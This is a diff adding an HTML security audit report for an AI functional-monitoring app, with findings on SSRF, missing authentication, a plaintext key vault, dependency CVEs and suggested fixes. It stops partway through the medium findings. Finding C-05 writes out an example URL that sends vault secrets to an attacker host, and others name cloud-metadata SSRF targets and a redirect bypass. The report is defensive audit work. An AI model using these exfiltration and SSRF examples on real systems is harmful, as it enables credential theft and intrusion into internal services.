@@ -1,0 +1,769 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Security Review — AI Functional Monitoring Suite</title>
+<style>
+  :root {
+    --bg:#0a0e15; --panel:#131922; --panel-2:#1a212d; --panel-3:#232b39;
+    --border:#262f3e; --border-strong:#36405a;
+    --text:#e2e8f0; --text-strong:#f8fafc; --muted:#94a3b8; --muted-2:#64748b;
+    --accent:#3b82f6; --accent-2:#60a5fa;
+    --critical:#dc2626; --critical-soft:rgba(220,38,38,.12);
+    --high:#ea580c;     --high-soft:rgba(234,88,12,.12);
+    --medium:#f59e0b;   --medium-soft:rgba(245,158,11,.12);
+    --low:#06b6d4;      --low-soft:rgba(6,182,212,.12);
+    --info:#64748b;     --info-soft:rgba(100,116,139,.12);
+    --safe:#10b981;     --safe-soft:rgba(16,185,129,.12);
+    --mono: ui-monospace, "SF Mono", Menlo, Consolas, monospace;
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0;padding:0;background:var(--bg);color:var(--text);
+    font-family:-apple-system,BlinkMacSystemFont,"Inter","Segoe UI",Roboto,sans-serif;
+    font-size:14px;line-height:1.55;-webkit-font-smoothing:antialiased}
+  a{color:var(--accent-2)}
+  ::-webkit-scrollbar{width:10px;height:10px}
+  ::-webkit-scrollbar-thumb{background:var(--panel-3);border:2px solid var(--bg);border-radius:999px}
+  ::-webkit-scrollbar-thumb:hover{background:var(--border-strong)}
+
+  .wrap{max-width:1180px;margin:0 auto;padding:32px 24px 80px}
+  .hero{border:1px solid var(--border);border-radius:14px;padding:28px 32px;
+    background:linear-gradient(180deg,#1a212d 0%,#131922 100%);margin-bottom:32px}
+  .hero .crumb{font-size:11px;text-transform:uppercase;letter-spacing:.12em;color:var(--muted);font-weight:600}
+  .hero h1{margin:8px 0 6px;font-size:32px;letter-spacing:-.02em;color:var(--text-strong)}
+  .hero .sub{margin:0;color:var(--muted);font-size:14px}
+  .hero .meta{display:flex;gap:20px;margin-top:18px;flex-wrap:wrap;font-size:12px;color:var(--muted)}
+  .hero .meta b{color:var(--text);font-weight:600}
+
+  .grid{display:grid;grid-template-columns:repeat(6,1fr);gap:12px;margin:24px 0 8px}
+  .stat{background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:18px 16px;
+    text-align:left;transition:border-color .15s,transform .15s;cursor:pointer}
+  .stat:hover{border-color:var(--border-strong);transform:translateY(-1px)}
+  .stat.active{box-shadow:inset 0 0 0 1px var(--accent)}
+  .stat .num{font-size:28px;font-weight:700;letter-spacing:-.02em;line-height:1}
+  .stat .lbl{font-size:11px;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);
+    font-weight:600;margin-top:6px}
+  .stat.critical .num{color:var(--critical)}
+  .stat.high .num{color:var(--high)}
+  .stat.medium .num{color:var(--medium)}
+  .stat.low .num{color:var(--low)}
+  .stat.info .num{color:var(--info)}
+  .stat.safe .num{color:var(--safe)}
+
+  .toolbar{display:flex;justify-content:space-between;align-items:center;gap:12px;
+    margin:20px 0 16px;flex-wrap:wrap}
+  .filter{display:inline-flex;gap:4px;background:var(--panel);border:1px solid var(--border);
+    border-radius:999px;padding:4px}
+  .filter button{background:transparent;border:0;color:var(--muted);padding:6px 14px;
+    border-radius:999px;cursor:pointer;font-weight:500;font-size:13px;transition:all .12s}
+  .filter button:hover{color:var(--text)}
+  .filter button.on{background:var(--panel-3);color:var(--text-strong)}
+  .search{display:inline-flex;align-items:center;gap:8px;background:var(--panel);
+    border:1px solid var(--border);border-radius:8px;padding:6px 12px;font-size:13px;min-width:280px}
+  .search input{background:transparent;border:0;color:var(--text);outline:0;flex:1;font-size:13px;font-family:inherit}
+  .search input::placeholder{color:var(--muted-2)}
+
+  h2.sec{margin:40px 0 14px;font-size:13px;text-transform:uppercase;letter-spacing:.08em;
+    color:var(--muted);font-weight:700;padding-bottom:10px;border-bottom:1px solid var(--border)}
+
+  .card{background:var(--panel);border:1px solid var(--border);border-radius:12px;
+    padding:22px 24px;margin-bottom:14px;transition:border-color .15s,box-shadow .15s}
+  .card:hover{border-color:var(--border-strong);box-shadow:0 4px 20px rgba(0,0,0,.2)}
+  .card.critical{border-left:4px solid var(--critical)}
+  .card.high{border-left:4px solid var(--high)}
+  .card.medium{border-left:4px solid var(--medium)}
+  .card.low{border-left:4px solid var(--low)}
+  .card.info{border-left:4px solid var(--info)}
+  .card.safe{border-left:4px solid var(--safe)}
+
+  .card-head{display:flex;align-items:flex-start;gap:12px;flex-wrap:wrap;margin-bottom:14px}
+  .badge{display:inline-flex;align-items:center;gap:6px;padding:4px 10px;border-radius:999px;
+    font-size:10.5px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;flex-shrink:0}
+  .badge.critical{background:var(--critical-soft);color:var(--critical);border:1px solid rgba(220,38,38,.35)}
+  .badge.high    {background:var(--high-soft);color:var(--high);border:1px solid rgba(234,88,12,.35)}
+  .badge.medium  {background:var(--medium-soft);color:var(--medium);border:1px solid rgba(245,158,11,.35)}
+  .badge.low     {background:var(--low-soft);color:var(--low);border:1px solid rgba(6,182,212,.35)}
+  .badge.info    {background:var(--info-soft);color:var(--muted);border:1px solid rgba(100,116,139,.35)}
+  .badge.safe    {background:var(--safe-soft);color:var(--safe);border:1px solid rgba(16,185,129,.35)}
+  .card-id{font-family:var(--mono);font-weight:600;font-size:12px;color:var(--muted);flex-shrink:0;padding-top:5px}
+  .card h3{margin:0;font-size:17px;line-height:1.35;color:var(--text-strong);font-weight:600;letter-spacing:-.01em;flex:1;min-width:0}
+
+  .where{display:inline-flex;align-items:center;gap:6px;background:var(--panel-2);border:1px solid var(--border);
+    border-radius:6px;padding:4px 10px;font-family:var(--mono);font-size:12px;color:var(--accent-2);margin-bottom:14px}
+  .where::before{content:"📂";opacity:.7}
+
+  pre.code{background:var(--bg);border:1px solid var(--border);border-radius:8px;
+    padding:14px 16px;margin:8px 0 14px;overflow-x:auto;font-family:var(--mono);
+    font-size:12.5px;line-height:1.55;color:var(--text)}
+  pre.code .cmt{color:var(--muted)}
+  pre.code .str{color:#a7f3d0}
+  pre.code .kw{color:#c4b5fd}
+  pre.code .fn{color:#fcd34d}
+
+  .row{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:6px}
+  @media (max-width:780px){.row{grid-template-columns:1fr}.grid{grid-template-columns:repeat(3,1fr)}}
+  .block{background:var(--panel-2);border:1px solid var(--border);border-radius:8px;padding:14px 16px}
+  .block h4{margin:0 0 8px;font-size:11px;text-transform:uppercase;letter-spacing:.08em;
+    color:var(--muted);font-weight:700;display:flex;align-items:center;gap:6px}
+  .block.why h4::before{content:"⚠";color:var(--medium)}
+  .block.fix h4::before{content:"✓";color:var(--safe)}
+  .block.what h4::before{content:"●";color:var(--accent-2)}
+  .block p{margin:0;color:var(--text);font-size:13.5px;line-height:1.6}
+  .block p + p{margin-top:8px}
+  .block code{background:var(--bg);padding:1px 6px;border-radius:4px;font-family:var(--mono);font-size:12px;color:var(--accent-2)}
+
+  .legend{display:flex;gap:18px;flex-wrap:wrap;font-size:12px;color:var(--muted);margin:10px 0 0}
+  .legend span{display:inline-flex;align-items:center;gap:6px}
+  .dot{width:10px;height:10px;border-radius:3px;display:inline-block}
+  .dot.critical{background:var(--critical)} .dot.high{background:var(--high)}
+  .dot.medium{background:var(--medium)}     .dot.low{background:var(--low)}
+  .dot.info{background:var(--info)}         .dot.safe{background:var(--safe)}
+
+  table.cvetab{width:100%;border-collapse:collapse;font-size:13px;margin-top:10px}
+  table.cvetab th{text-align:left;color:var(--muted);font-weight:600;padding:8px 10px;
+    border-bottom:1px solid var(--border);font-size:11px;text-transform:uppercase;letter-spacing:.05em}
+  table.cvetab td{padding:10px;border-bottom:1px solid var(--border);vertical-align:top}
+  table.cvetab td code{background:var(--bg);padding:1px 5px;border-radius:4px;font-family:var(--mono);font-size:12px}
+  table.cvetab tr:hover td{background:var(--panel-2)}
+
+  ol.action{padding-left:0;list-style:none;counter-reset:step;margin:0}
+  ol.action li{counter-increment:step;background:var(--panel);border:1px solid var(--border);
+    border-radius:10px;padding:16px 20px 16px 60px;position:relative;margin-bottom:10px}
+  ol.action li::before{content:counter(step);position:absolute;left:18px;top:50%;transform:translateY(-50%);
+    width:28px;height:28px;background:var(--accent);color:#fff;font-weight:700;
+    border-radius:999px;display:grid;place-items:center;font-size:13px}
+  ol.action li b{color:var(--text-strong)}
+  ol.action li .eta{display:inline-block;background:var(--panel-2);border:1px solid var(--border);
+    border-radius:999px;padding:1px 8px;font-size:11px;color:var(--muted);margin-left:8px;font-weight:500}
+
+  details.summary-panel{background:var(--panel);border:1px solid var(--border);border-radius:10px;
+    padding:14px 18px;margin-bottom:24px}
+  details.summary-panel summary{cursor:pointer;font-weight:600;color:var(--text-strong);font-size:14px;outline:0}
+  details.summary-panel p{color:var(--text);margin:10px 0 0;font-size:13.5px}
+  details.summary-panel ul{margin:8px 0 0;padding-left:22px}
+  details.summary-panel li{margin:4px 0}
+
+  .footer{margin-top:60px;padding-top:24px;border-top:1px solid var(--border);color:var(--muted);
+    font-size:12px;line-height:1.7}
+  .footer code{background:var(--panel-2);padding:1px 6px;border-radius:4px;font-family:var(--mono);font-size:11px}
+
+  .hidden{display:none !important}
+
+  @media print {
+    body{background:#fff;color:#0f172a}
+    .wrap{max-width:none;padding:16px}
+    .card,.hero,.stat,.block,.search,.filter,details.summary-panel{
+      background:#fff !important;border-color:#cbd5e1 !important;color:#0f172a !important;box-shadow:none !important}
+    pre.code{background:#f1f5f9;color:#0f172a}
+    .toolbar{display:none}
+    .card{break-inside:avoid;page-break-inside:avoid}
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header class="hero">
+  <div class="crumb">Security Review · Phase 1.27 baseline</div>
+  <h1>AI-Powered Functional Monitoring Suite</h1>
+  <p class="sub">Comprehensive security audit of backend, frontend, configuration, deployment, and dependencies.</p>
+  <div class="meta">
+    <span><b>Date:</b> 2026-06-12</span>
+    <span><b>Reviewer:</b> Senior Application-Security Engineer</span>
+    <span><b>Codebase commit:</b> Phase 1.27.8 (post AWS SES migration)</span>
+    <span><b>Backend LOC:</b> ~8.7k TS</span>
+    <span><b>Total findings:</b> 32 + 14 verified-safe</span>
+  </div>
+</header>
+
+<details class="summary-panel" open>
+  <summary>Executive summary — read this first</summary>
+  <p>
+    The codebase is <b>appropriate for the documented threat model</b> (single-user, trusted-LAN, no auth) but
+    <b>five Critical and four High findings</b> would make it dangerous to expose to any untrusted network. The
+    biggest single concern is <b>SSRF</b>: the app's core function is to fetch arbitrary user-supplied URLs, and
+    there is currently <b>no private-IP blocklist, no DNS-rebinding defense, and no redirect re-validation</b> — a
+    malicious project member can point the monitor at <code>http://169.254.169.254/</code> (AWS metadata) or
+    internal admin panels. The recently-shipped Phase 1.27.4 <code>{{api_key}}</code> substitution feature compounds
+    this by making vault credentials exfiltratable through any template field.
+  </p>
+  <p><b>Positive findings worth keeping:</b></p>
+  <ul>
+    <li>SQL is 100% parameterized — <b>no SQL injection</b> anywhere in <code>store.ts</code> or <code>db.ts</code>.</li>
+    <li>All user-controlled HTML output passes through <code>escapeHtml()</code> — <b>no XSS</b> in the audit report or email body.</li>
+    <li>No <code>dangerouslySetInnerHTML</code>, <code>eval</code>, or <code>new Function</code> anywhere in the frontend.</li>
+    <li>API-key values are masked in the UI (<code>maskKey()</code>) and the new variable panel shows names only.</li>
+    <li><code>.gitignore</code> correctly covers <code>.env</code>, the SQLite DB + WAL files, audit reports, and uploads.</li>
+    <li>30-day data retention is properly enforced via <code>pruneOldChecks()</code>.</li>
+  </ul>
+</details>
+
+<div class="grid">
+  <button class="stat critical" data-filter-stat="critical"><div class="num">5</div><div class="lbl">Critical</div></button>
+  <button class="stat high"     data-filter-stat="high">    <div class="num">4</div><div class="lbl">High</div></button>
+  <button class="stat medium"   data-filter-stat="medium">  <div class="num">12</div><div class="lbl">Medium</div></button>
+  <button class="stat low"      data-filter-stat="low">     <div class="num">7</div><div class="lbl">Low</div></button>
+  <button class="stat info"     data-filter-stat="info">    <div class="num">4</div><div class="lbl">Info</div></button>
+  <button class="stat safe"     data-filter-stat="safe">    <div class="num">14</div><div class="lbl">Verified&nbsp;Safe</div></button>
+</div>
+<div class="legend">
+  <span><span class="dot critical"></span>Critical — fix before any non-LAN exposure</span>
+  <span><span class="dot high"></span>High — fix soon, exploitable in realistic scenarios</span>
+  <span><span class="dot medium"></span>Medium — hardening; should fix</span>
+  <span><span class="dot low"></span>Low — defense-in-depth</span>
+  <span><span class="dot info"></span>Info — awareness only</span>
+  <span><span class="dot safe"></span>Verified safe — keep the practice</span>
+</div>
+
+<div class="toolbar">
+  <div class="filter" id="sevFilter">
+    <button data-sev="all" class="on">All (46)</button>
+    <button data-sev="critical">Critical</button>
+    <button data-sev="high">High</button>
+    <button data-sev="medium">Medium</button>
+    <button data-sev="low">Low</button>
+    <button data-sev="info">Info</button>
+    <button data-sev="safe">Safe</button>
+  </div>
+  <div class="search">
+    🔍 <input id="searchBox" placeholder="Search findings (file, term, CVE…)" autocomplete="off">
+  </div>
+</div>
+
+<h2 class="sec">🔴 Critical findings</h2>
+
+<article class="card critical" data-sev="critical">
+  <div class="card-head"><span class="badge critical">Critical</span><span class="card-id">C-01</span><h3>SSRF — no private-IP blocklist on user-supplied URLs</h3></div>
+  <div class="where">backend/src/timing.ts:31-163 · backend/src/monitor.ts:39-67</div>
+<pre class="code">// timing.ts (paraphrased)
+parsed = new URL(spec.url);              // any URL accepted
+const isHttps = parsed.protocol === "https:";
+const transport = isHttps ? httpsRequest : httpRequest;
+const req = transport({ hostname: parsed.hostname, ... });   // no IP check</pre>
+  <div class="row">
+    <div class="block why"><h4>Why it's a problem</h4><p>
+      The entire purpose of the app is to fetch user-supplied URLs on a schedule. There is <b>no blocklist</b>
+      for <code>127.0.0.0/8</code>, <code>10.0.0.0/8</code>, <code>172.16.0.0/12</code>, <code>192.168.0.0/16</code>,
+      <code>169.254.0.0/16</code> (incl. the AWS metadata endpoint <code>169.254.169.254</code>), or IPv6
+      <code>::1</code> / <code>fc00::/7</code>. A malicious project member — or anyone exploiting <span class="badge critical" style="font-size:10px;padding:1px 6px">C-03</span> — can point the monitor at:
+    </p><p>
+      • internal admin dashboards (e.g. an internal Grafana on <code>10.0.0.50:3000</code>)<br>
+      • cloud metadata endpoints to steal IAM credentials<br>
+      • localhost services (Redis, the monitor's own DB endpoints, etc.)<br>
+      • non-HTTP schemes if added later (<code>file://</code>, <code>gopher://</code>, <code>dict://</code>)
+    </p><p>The <code>addUrl()</code> validator in <code>store.ts</code> only checks that the protocol is <code>http(s)</code> and the URL parses — it never resolves the hostname or checks the resulting IP.</p></div>
+    <div class="block fix"><h4>Fix</h4><p>
+      Before every <code>timedFetch</code>, resolve the hostname with <code>dns.lookup()</code> and reject any IP that matches the private/loopback/metadata ranges (use a vetted library like <code>ssrf-req-filter</code> or <code>is-private</code>, or hand-roll a CIDR check). Apply the same check to <i>every redirect</i> hop (see C-02). Optionally make the blocklist tunable via env (<code>SSRF_ALLOW_PRIVATE_RANGES=true</code> for explicit opt-in on a closed LAN).
+    </p></div>
+  </div>
+</article>
+
+<article class="card critical" data-sev="critical">
+  <div class="card-head"><span class="badge critical">Critical</span><span class="card-id">C-02</span><h3>SSRF extension — HTTP redirects followed without IP re-validation</h3></div>
+  <div class="where">backend/src/timing.ts:83-92</div>
+<pre class="code">const req = transport({
+  protocol: parsed.protocol, hostname: parsed.hostname,
+  port: parsed.port || (isHttps ? 443 : 80),
+  path: `${parsed.pathname}${parsed.search}`,
+  method: spec.method, agent: false, headers,
+});   // node:http follows redirects via the consuming code path; new IP NOT revalidated</pre>
+  <div class="row">
+    <div class="block why"><h4>Why it's a problem</h4><p>Even if you fix C-01 by checking the FIRST hop, an attacker-controlled host can return <code>302 Location: http://169.254.169.254/</code> and the redirect target is fetched without re-validating its IP. This is the classic SSRF-via-redirect bypass.</p></div>
+    <div class="block fix"><h4>Fix</h4><p>Disable automatic redirect following in <code>timedFetch</code> (set <code>maxRedirects: 0</code> or handle redirects manually). When a 3xx comes back, parse <code>Location</code>, re-run the C-01 blocklist on the new hostname, and only then re-issue the request. Cap total redirects at 5.</p></div>
+  </div>
+</article>
+
+<article class="card critical" data-sev="critical">
+  <div class="card-head"><span class="badge critical">Critical</span><span class="card-id">C-03</span><h3>No authentication or authorization on any endpoint</h3></div>
+  <div class="where">backend/src/index.ts — every route</div>
+<pre class="code">app.use(cors());
+app.use(express.json({ limit: "1mb" }));
+
+app.get   ("/api/projects",     (_req, res) => res.json(listProjects()));
+app.post  ("/api/projects",     (req,  res) => res.status(201).json(createProject(req.body)));
+app.delete("/api/projects/:id", (req,  res) => { deleteProject(req.params.id); ... });
+// ...60+ more routes, ZERO auth middleware</pre>
+  <div class="row">
+    <div class="block why"><h4>Why it's a problem</h4><p>
+      There is no JWT, session, API key, or even Basic Auth gate. Combined with <span class="badge high" style="font-size:10px;padding:1px 6px">H-01</span> (backend binds to <code>0.0.0.0</code>), anyone on the same LAN — or anyone on the internet if you ever port-forward 4000 — can: enumerate every project, modify URLs/flows, dump API-key metadata, trigger audit-report generation, and DELETE projects with no recovery. There's also <b>no project-owner concept</b> — projects are isolation units within one install but anyone with network access can touch any of them.
+    </p></div>
+    <div class="block fix"><h4>Fix</h4><p>
+      Acceptable for strict localhost-only dev. If anyone else's machine ever needs access, add at minimum a single shared secret in a header (<code>X-Auth-Token</code>) checked by middleware. Long-term: real users with sessions, plus a <code>projects.owner_id</code> FK + an authorization middleware that confirms <code>req.user.id === project.owner_id</code> for every mutating route.
+    </p></div>
+  </div>
+</article>
+
+<article class="card critical" data-sev="critical">
+  <div class="card-head"><span class="badge critical">Critical</span><span class="card-id">C-04</span><h3>API-key vault stores secrets in plaintext</h3></div>
+  <div class="where">backend/src/db.ts:63-71 · backend/src/store.ts addApiKey()</div>
+<pre class="code">CREATE TABLE IF NOT EXISTS api_keys (
+  id            TEXT PRIMARY KEY,
+  project_id    TEXT NOT NULL,
+  name          TEXT NOT NULL,
+  value         TEXT NOT NULL,            -- ← PLAINTEXT SECRET
+  header_name   TEXT NOT NULL DEFAULT 'Authorization',
+  header_prefix TEXT NOT NULL DEFAULT 'Bearer ',
+  FOREIGN KEY (project_id) REFERENCES projects(id) ON DELETE CASCADE
+);</pre>
+  <div class="row">
+    <div class="block why"><h4>Why it's a problem</h4><p>
+      Anyone with read access to <code>backend/data/db.sqlite</code> — a stolen laptop, a leaked backup, a misconfigured restore, a Time Machine snapshot, a developer's <code>cp db.sqlite ~/Desktop/poke.sqlite</code> — recovers every vault secret in plain text. Slack webhook URLs and email recipient lists are similarly plaintext.
+    </p></div>
+    <div class="block fix"><h4>Fix</h4><p>
+      Encrypt at rest with a master key from env (<code>VAULT_MASTER_KEY</code>) using <code>node:crypto</code> AES-256-GCM. Decrypt only inside <code>resolveApiKeyHeader()</code> + <code>getProjectApiKeysScope()</code>, never store decrypted values in memory longer than the request. For production: source the master key from AWS KMS / GCP KMS / HashiCorp Vault rather than env. Also restrict <code>db.sqlite</code> file mode to <code>0600</code> on Linux/macOS — the current code inherits umask.
+    </p></div>
+  </div>
+</article>
+
+<article class="card critical" data-sev="critical">
+  <div class="card-head"><span class="badge critical">Critical</span><span class="card-id">C-05</span><h3>API-key <code>{{var}}</code> substitution enables silent exfiltration (Phase 1.27.4 design risk)</h3></div>
+  <div class="where">backend/src/monitor.ts:55-66 · backend/src/store.ts getProjectApiKeysScope() · backend/src/flowRunner.ts:782 · backend/src/prereqRunner.ts</div>
+<pre class="code">// monitor.ts (Phase 1.27.4)
+const projectVars: Record&lt;string, string&gt; = {
+  ...getProjectApiKeysScope(url.projectId),   // every vault value, by slug
+  ...getProjectVariables(url.projectId),
+};
+const requestSpec = {
+  url: substitute(url.url, projectVars),       // ← {{stripe_key}} resolves to raw secret
+  body: substitute(url.body, projectVars),
+  customHeaders: substituteKv(url.customHeaders, projectVars),
+  queryParams: substituteKv(url.queryParams, projectVars),
+};</pre>
+  <div class="row">
+    <div class="block why"><h4>Why it's a problem</h4><p>
+      Anyone able to edit a project (which today is <i>anyone with network access</i> per <span class="badge critical" style="font-size:10px;padding:1px 6px">C-03</span>) can exfiltrate every vault key with one URL: <code>https://attacker.com/?leak={{stripe_key}}&amp;aws={{aws_root}}</code>. The monitor will dutifully send that request on schedule. The same trick works in headers, body, query params, and inside any flow step. <b>This was an explicit design tradeoff</b> — the convenience of Postman-style substitution vs. credential containment.
+    </p></div>
+    <div class="block fix"><h4>Fix</h4><p>
+      Three options, pick one:<br>
+      <b>(a)</b> Restrict <code>{{api_key}}</code> resolution to <b>header values only</b> — the original auto-inject use case. Drop URL/body/query substitution for vault scope.<br>
+      <b>(b)</b> Add an "egress allowlist" per project — only specific outbound hosts may receive substituted variables.<br>
+      <b>(c)</b> Keep current behavior, but require an explicit project-level toggle (<code>allow_vault_in_url_substitution</code>) defaulting to <i>off</i>, and add an audit-log entry every time a vault var is substituted into a URL/body/query.
+    </p></div>
+  </div>
+</article>
+
+<h2 class="sec">🟠 High findings</h2>
+
+<article class="card high" data-sev="high">
+  <div class="card-head"><span class="badge high">High</span><span class="card-id">H-01</span><h3>Backend binds to 0.0.0.0 (LAN-exposed by default)</h3></div>
+  <div class="where">backend/src/index.ts (the final app.listen call)</div>
+<pre class="code">app.listen(PORT, () => {
+  console.log(`[monitoring-backend] listening on http://localhost:${PORT}`);
+});
+// ↑ no host arg → Node defaults to 0.0.0.0 (all interfaces)
+// ↑ log message LIES — says "localhost" but it's reachable from the whole LAN</pre>
+  <div class="row">
+    <div class="block why"><h4>Why it's a problem</h4><p>The log line says "localhost" so operators assume it's safe; reality is that anyone on the LAN can hit the unauthenticated API (see C-03). On a coffee-shop WiFi this is an immediate breach.</p></div>
+    <div class="block fix"><h4>Fix</h4><p>
+      <code>app.listen(PORT, process.env.BACKEND_HOST ?? "127.0.0.1", ...)</code> and document the override. Same fix in <code>frontend/vite.config.ts</code> (<code>server.host: "127.0.0.1"</code>).
+    </p></div>
+  </div>
+</article>
+
+<article class="card high" data-sev="high">
+  <div class="card-head"><span class="badge high">High</span><span class="card-id">H-02</span><h3>No rate limiting on any endpoint</h3></div>
+  <div class="where">backend/src/index.ts — entire route table</div>
+  <div class="row">
+    <div class="block why"><h4>Why it's a problem</h4><p>An attacker can flood POST <code>/api/projects/:id/urls</code> to fill SQLite, POST 10MB uploads in a loop to fill disk, or brute-force project UUIDs to enumerate them. Any of these takes down the dev box.</p></div>
+    <div class="block fix"><h4>Fix</h4><p>
+      <code>npm i express-rate-limit</code>, then <code>app.use(rateLimit({ windowMs: 60_000, max: 600, skip: r =&gt; r.ip === "::1" }))</code>. Add a stricter per-IP limit on <code>POST /uploads</code> and <code>POST /projects</code> (10/min each).
+    </p></div>
+  </div>
+</article>
+
+<article class="card high" data-sev="high">
+  <div class="card-head"><span class="badge high">High</span><span class="card-id">H-03</span><h3>Vite ≤6.4.2 — three CVEs incl. <code>server.fs.deny</code> bypass on Windows</h3></div>
+  <div class="where">frontend/node_modules/vite (current version below 6.4.2)</div>
+<pre class="code">npm audit
+  vite  &lt;=6.4.2  (high)
+    GHSA-fx2h-pf6j-xcff  Windows alternate-path bypass of server.fs.deny  (HIGH)
+    GHSA-v6wh-96g9-6wx3  NTLMv2 hash disclosure via UNC paths             (MOD)
+    GHSA-4w7w-66w2-5vf9  Path traversal in optimized deps .map handling   (MOD)
+  esbuild &lt;=0.24.2 (moderate)
+    GHSA-67mh-4wv8-2f99  Any website can read dev-server responses        (MOD)</pre>
+  <div class="row">
+    <div class="block why"><h4>Why it's a problem</h4><p>On Windows specifically — and you ARE on Windows — the path-bypass CVE lets an attacker who can lure you to a malicious site read files outside <code>frontend/</code> via your running dev server. NTLMv2 hash disclosure can leak your Windows credentials to an attacker-controlled SMB endpoint.</p></div>
+    <div class="block fix"><h4>Fix</h4><p>
+      <code>npm i vite@latest</code> in <code>frontend/</code>. <code>npm audit fix --force</code> bumps to <code>vite@8.0.16</code> (major); test that the app still builds. If you can't do the major bump today, at least bind the dev server to <code>127.0.0.1</code> (H-01 fix doubles as mitigation here).
+    </p></div>
+  </div>
+</article>
+
+<article class="card high" data-sev="high">
+  <div class="card-head"><span class="badge high">High</span><span class="card-id">H-04</span><h3>No security headers (no <code>helmet</code> middleware)</h3></div>
+  <div class="where">backend/src/index.ts:77</div>
+  <div class="row">
+    <div class="block why"><h4>Why it's a problem</h4><p>Missing <code>X-Content-Type-Options</code>, <code>X-Frame-Options</code>, <code>Referrer-Policy</code>, <code>Permissions-Policy</code>, <code>Strict-Transport-Security</code> (when behind HTTPS), and CSP. The HTML reports served at <code>/reports/</code> are particularly exposed — they could be framed by other sites for clickjacking.</p></div>
+    <div class="block fix"><h4>Fix</h4><p><code>npm i helmet</code>, then <code>app.use(helmet())</code> as the very first middleware. One line, ~15 hardened headers, no config needed.</p></div>
+  </div>
+</article>
+
+<h2 class="sec">🟡 Medium findings</h2>
+
+<article class="card medium" data-sev="medium">
+  <div class="card-head"><span class="badge medium">Medium</span><span class="card-id">M-01</span><h3><code>cors()</code> allows any origin</h3></div>
+  <div class="where">backend/src/index.ts:77</div>
+<pre class="code">app.use(cors());   // defaults to Access-Control-Allow-Origin: *</pre>
+  <div class="block why"><h4>Why it's a problem</h4><p>Harmless today because there is no auth (C-03), but the moment any cookie-based session is added, every site on the internet can issue authenticated requests on the user's behalf — full CSRF surface.</p></div>
+  <div class="block fix"><h4>Fix</h4><p><code>cors({ origin: process.env.FRONTEND_ORIGIN ?? "http://127.0.0.1:5173", credentials: true })</code>.</p></div>
+</article>
+
+<article class="card medium" data-sev="medium">
+  <div class="card-head"><span class="badge medium">Medium</span><span class="card-id">M-02</span><h3>Plain HTTP — credentials in cleartext on LAN</h3></div>
+  <div class="where">all of dev mode</div>
+  <div class="block why"><h4>Why it's a problem</h4><p>API-key values pasted into the Settings panel travel the network plaintext. Any LAN packet capture (<code>tshark</code>, malicious WiFi AP) sees them. Same for Slack webhook URLs and recipient email addresses.</p></div>
+  <div class="block fix"><h4>Fix</h4><p>Document explicitly: dev = localhost only. For shared deployment terminate TLS at a reverse proxy (nginx + Let's Encrypt, Caddy, or AWS ALB) and bind the backend to <code>127.0.0.1</code> behind it.</p></div>
+</article>
+
+<article class="card medium" data-sev="medium">
+  <div class="card-head"><span class="badge medium">Medium</span><span class="card-id">M-03</span><h3>Audit reports never auto-pruned</h3></div>
+  <div class="where">backend/src/audit.ts (writeFileSync) · backend/src/db.ts pruneOldChecks()</div>
+  <div class="block why"><h4>Why it's a problem</h4><p>Every Snapshot &amp; Report click writes a new HTML file under <code>data/reports/</code>. The 365-day retention sweeper in <code>db.ts</code> covers DB rows but NOT these files. A long-running project with daily audits grows the folder forever; eventually fills disk.</p></div>
+  <div class="block fix"><h4>Fix</h4><p>Add a <code>pruneOldReports(reportsDir, maxAgeDays = 30)</code> helper called from the same hourly tick as <code>pruneOldChecks()</code>. ~15 lines.</p></div>
+</article>
+
+<article class="card medium" data-sev="medium">
+  <div class="card-head"><span class="badge medium">Medium</span><span class="card-id">M-04</span><h3>Vite dev server also binds to 0.0.0.0</h3></div>
+  <div class="where">frontend/vite.config.ts</div>
+  <div class="block why"><h4>Why it's a problem</h4><p>Same fault as H-01 on a different process. The frontend doesn't hold secrets directly but anyone on the LAN can browse your dev UI and proxy through to the backend.</p></div>
+  <div class="block fix"><h4>Fix</h4><p>Add <code>server: { host: "127.0.0.1" }</code> to <code>vite.config.ts</code>.</p></div>
+</article>
+
+<article class="card medium" data-sev="medium">
+  <div class="card-head"><span class="badge medium">Medium</span><span class="card-id">M-05</span><h3>Open-redirect / <code>javascript:</code> URI in URL card</h3></div>
+  <div class="where">frontend/src/components/UrlCard.tsx:87-89</div>
+<pre class="code">&lt;a className="url-link" href={url.url} target="_blank" rel="noreferrer"&gt;
+  {url.url}
+&lt;/a&gt;</pre>
+  <div class="block why"><h4>Why it's a problem</h4><p>The href is user-controlled. <code>addUrl()</code> validates that <code>new URL(...)</code> succeeds and rejects non-http(s) <i>protocols</i> — good — but the validator only fires on create/update. If a project import or a malicious patch ever bypasses it, a click could run arbitrary script. Also <code>rel="noreferrer"</code> alone misses <code>noopener</code> on some old browsers.</p></div>
+  <div class="block fix"><h4>Fix</h4><p>Centralize a <code>safeHref(url)</code> helper that re-validates protocol on render and returns <code>"#"</code> on fail. Change rel to <code>rel="noopener noreferrer"</code>.</p></div>
+</article>
+
+<article class="card medium" data-sev="medium">
+  <div class="card-head"><span class="badge medium">Medium</span><span class="card-id">M-06</span><h3><code>localStorage</code> quota + info-disclosure</h3></div>
+  <div class="where">frontend/src/App.tsx (fm:scroll:* keys), theme.ts</div>
+  <div class="block why"><h4>Why it's a problem</h4><p>One key per visited project (<code>fm:scroll:&lt;projectId&gt;</code>) accumulates forever. Any script with DOM access (including a future XSS or a malicious browser extension) can enumerate every project the user has ever opened.</p></div>
+  <div class="block fix"><h4>Fix</h4><p>Switch scroll + section state to <code>sessionStorage</code> (theme + active project can stay in localStorage). Add a one-shot cleanup at App mount that removes <code>fm:scroll:*</code> keys older than 30 days.</p></div>
+</article>
+
+<article class="card medium" data-sev="medium">
+  <div class="card-head"><span class="badge medium">Medium</span><span class="card-id">M-07</span><h3>No Content-Security-Policy</h3></div>
+  <div class="where">frontend/index.html · backend responses</div>
+  <div class="block why"><h4>Why it's a problem</h4><p>Today there's no inline-script / inline-style usage, and React escapes user strings, so XSS isn't open. But CSP is the safety net that catches the NEXT regression — without it, a single misuse of <code>dangerouslySetInnerHTML</code> down the line is immediately exploitable.</p></div>
